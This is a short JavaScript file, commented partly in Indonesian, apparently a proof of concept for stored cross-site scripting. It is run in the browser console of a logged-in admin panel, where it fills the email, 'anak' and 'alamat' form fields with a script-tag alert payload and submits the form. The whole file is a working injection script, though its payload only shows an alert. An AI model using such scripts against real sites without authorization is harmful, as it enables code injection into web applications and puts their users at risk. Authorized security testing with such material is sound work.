
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {
    // Fill form dengan payload
    document.getElementById('email').value = `<script>alert("XSS")</script>`;
    document.getElementById('anak').value = `<script>alert("XSS")</script>`;
    document.getElementById('alamat').value = `<script>alert("XSS")</script>`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}

// Execute
injectPayload();
